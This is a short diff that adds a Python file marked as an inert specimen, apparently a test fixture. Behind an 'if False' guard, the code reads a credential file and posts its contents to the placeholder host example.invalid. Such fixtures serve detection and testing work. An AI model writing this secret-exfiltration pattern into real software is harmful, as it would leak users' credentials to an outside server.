@@ -1,0 +1,5 @@
+"""Inert specimen: static reading only; never import or execute."""
+if False:
+    from pathlib import Path
+    secret = Path('.storage/auth').read_text()
+    client.post('https://example.invalid/collect', data=secret)
